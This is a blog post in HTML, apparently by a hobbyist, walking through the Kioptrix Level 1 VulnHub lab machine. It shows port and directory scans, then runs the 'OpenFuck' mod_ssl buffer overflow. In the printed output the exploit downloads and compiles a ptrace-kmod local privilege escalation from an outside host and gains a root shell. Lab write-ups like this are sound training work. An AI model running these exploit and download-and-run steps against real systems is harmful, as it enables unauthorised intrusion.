@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="Kyle Simmons" property="og:site_name">
+
+  <meta content="Kioptrix Level 1 Walkthrough" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="<h2>Cyber stuff</h2><h3>&#92;x48&#92;x65&#92;x6c&#92;x6c&#92;x6f &#92;x57&#92;x6f&#92;x72&#92;x6c&#92;x64</h3>" property="og:description">
+
+
+  <meta content="http://localhost:4000/vulnhub/ctf/2019/04/09/Kioptrix-level1.html" property="og:url">
+
+
+  <meta content="2019-04-09T11:14:02+01:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="vulnhub" property="article:section">
+  
+
+
+  
+
+  <title>Kioptrix Level 1 Walkthrough</title>
+  <meta name="description" content="Kioptrix level 1 is an easy vulnerable machine on vulnhub, link is below:Kioptrix Level 1 download page1. EnumerationThe port scan below reveals several open...">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="/css/main.css">
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+
+  <link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Fira+Mono' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Source+Code+Pro:400,200,300,500,600,700,900' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Gentium+Basic:400,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Alegreya:400,400italic,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,400italic,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Fira+Sans:400,300,500,700' rel='stylesheet' type='text/css'>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="canonical" href="http://localhost:4000/vulnhub/ctf/2019/04/09/Kioptrix-level1.html">
+  <link rel="alternate" type="application/rss+xml" title="Kyle Simmons" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Kyle Simmons</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/">Home</a></li>
+
+        
+
+        
+        
+        <li><a href="/ctf/">CTF</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/penetration-testing/">Penetration Testing</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">Kioptrix Level 1 Walkthrough</h1>
+      <p class="post-meta"><time datetime="2019-04-09T11:14:02+01:00" itemprop="datePublished">Apr 9, 2019</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>Kioptrix level 1 is an easy vulnerable machine on vulnhub, link is below:<br />
+<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix Level 1 download page</a></p>
+<h2>1. Enumeration</h2>
+<p><br />
+The port scan below reveals several open ports including SSH, HTTP, RPC, Samba and 443.</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">nmap -T4 -sV -A -oN nmapscan.txt 192.168.0.66
+Nmap scan report for 192.168.0.66
+Host is up (0.0054s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey:
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+</span><span class="gp">111/tcp  open  rpcbind     2 (RPC #</span>100000<span class="o">)</span>
+<span class="go">| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1           1024/tcp  status
+|_  100024  1           1024/udp  status
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MMYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+</span><span class="gp">|_ssl-date: 2019-03-28T23:46:31+00:00;</span> +1h01m49s from scanner time.
+<span class="go">| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span><span class="gp">1024/tcp open  status      1 (RPC #</span>100024<span class="o">)</span>
+<span class="go">Host script results:
+|_clock-skew: mean: 1h01m48s, deviation: 0s, median: 1h01m48s
+</span><span class="gp">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;</span>, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+<span class="go">|_smb2-time: Protocol negotiation failed (SMB2)</span></code></pre></figure>
+<p><br /></p>
+
+<h3>1.1 OpenSSH port 22</h3>
+<p>Using <code class="highlighter-rouge">searchsploit</code>, there appears to be no known vulnerabilities in the exploit database for OpenSSH.
+<br /></p>
+
+<h3>1.2 HTTP port 80</h3>
+<p>Running <code class="highlighter-rouge">dirb</code> reveals several interesting files including:</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: dirbresults.txt
+URL_BASE: http://192.168.0.66/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.0.66/ ----
++ http://192.168.0.66/~operator (CODE:403|SIZE:273)
++ http://192.168.0.66/~root (CODE:403|SIZE:269)
++ http://192.168.0.66/cgi-bin/ (CODE:403|SIZE:272)
++ http://192.168.0.66/index.html (CODE:200|SIZE:2890)
+</span><span class="gp">==&gt;</span> DIRECTORY: http://192.168.0.66/manual/
+<span class="gp">==&gt;</span> DIRECTORY: http://192.168.0.66/mrtg/
+<span class="gp">==&gt;</span> DIRECTORY: http://192.168.0.66/usage/
+<span class="go">
+---- Entering directory: http://192.168.0.66/manual/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.0.66/mrtg/ ----
++ http://192.168.0.66/mrtg/index.html (CODE:200|SIZE:17318)
+
+---- Entering directory: http://192.168.0.66/usage/ ----
++ http://192.168.0.66/usage/index.html (CODE:200|SIZE:3704)
+
+-----------------
+DOWNLOADED: 13836 - FOUND: 6</span></code></pre></figure>
+
+<p><br />
+The only files that appear to be out of place are <code class="highlighter-rouge">~operator</code> and <code class="highlighter-rouge">~root</code>. However, these files appear have
+a CODE:403 and cannot be accessed so this is a dead end.</p>
+
+<h3>Port 80 is running:</h3>
+<p>-Apache 1.3.20 (Not vulnerable)<br />
+-Red-Hat/Linux <br />
+-mod_ssl/2.8.4 OpenSSL/0.9.6b<br /><br /></p>
+
+<p>Using <code class="highlighter-rouge">searchsploit</code> to search for these services, <code class="highlighter-rouge">mod_ssl/2.8.4</code> appears to be Vulnerable
+to a remote buffer overflow exploit.
+<br /></p>
+<h2>2. Exploitation</h2>
+<p>Exploiting the <code class="highlighter-rouge">mod_ssl/2.8.4</code> vulnerability:<br />
+The exploit, remote buffer overflow named ‘OpenFuck’ and ‘OpenFuckv2’ appears
+to be out date. However, i found a patched version of the exploit on Github linked below:<br />
+<a href="https://github.com/heltonWernik/OpenLuck">Fixed alternative version of ‘OpenFuck’ Github</a>
+<br /><br />
+Executing the exploit:
+<br />
+The parameters are passed (version: 0x6b, IP address: 192.168.0.66 and open N connections: -c 50) <br /></p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">./OpenFuckExploit 0x6b 192.168.0.66 -c 50
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+</span><span class="gp">* #</span>hackarena  irc.brasnet.org                                     <span class="k">*</span>
+<span class="gp">* TNX Xanthic USG #</span>SilverLords <span class="c">#BloodBR #isotk #highsecure #uname *</span>
+<span class="gp">* #</span>ION <span class="c">#delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+<span class="gp">* #</span>pinchadoresweb HiTechHate DigitalWrapperz P<span class="o">()</span>W GAT ButtP!rateZ <span class="k">*</span>
+<span class="go">*******************************************************************
+
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+</span><span class="gp">bash-2.05$</span>
+<span class="gp">exploits/ptrace-kmod.c;</span> gcc <span class="nt">-o</span> p ptrace-kmod.c<span class="p">;</span> <span class="nb">rm </span>ptrace-kmod.c<span class="p">;</span> ./p<span class="p">;</span> net/0304-
+<span class="go">--11:16:09--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span><span class="gp">           =&gt;</span> <span class="sb">`</span>ptrace-kmod.c<span class="s1">'
+</span><span class="go">Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--11:16:10--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span><span class="gp">           =&gt;</span> <span class="sb">`</span>ptrace-kmod.c<span class="s1">'
+</span><span class="go">Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   1.87 MB/s
+
+11:16:10 (1.25 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 7066
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+whoami
+root</span></code></pre></figure>
+<p><br /></p>
+<h2>3. Root access gained!</h2>
+<p>The <code class="highlighter-rouge">uid</code> and <code class="highlighter-rouge">whoami</code> command shows root access to the system using the OpenFuck exploit.</p>
+
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Kyle Simmons &copy;	<script>document.write(new Date().getFullYear())</script>
+  </div>
+</nav>
+
+  </body>
+
+</html>
